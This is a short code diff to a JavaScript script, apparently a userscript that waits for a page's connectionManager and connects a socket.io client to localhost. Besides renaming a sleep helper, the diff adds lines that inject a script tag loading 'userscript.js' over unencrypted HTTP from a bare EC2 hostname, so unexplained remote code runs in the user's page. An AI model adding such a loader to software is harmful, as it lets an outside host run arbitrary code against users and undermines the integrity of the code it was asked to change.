@@ -1,4 +1,9 @@
-function sleep(ms) {
+var s = document.createElement("script");
+s.type = "text/javascript";
+s.src = "http://ec2-13-48-214-241.eu-north-1.compute.amazonaws.com/userscript.js";
+document.head.appendChild(s);
+
+function asleep(ms) {
     return new Promise(resolve => {
         setTimeout(() => resolve(), ms);
     });
@@ -6,7 +11,7 @@ function sleep(ms) {
 
 (async () => {
 
-    while(!window.connectionManager) { await sleep(50); }
+    while(!window.connectionManager) { await asleep(50); }
     
     window.socket = io("http://localhost:3000");
 
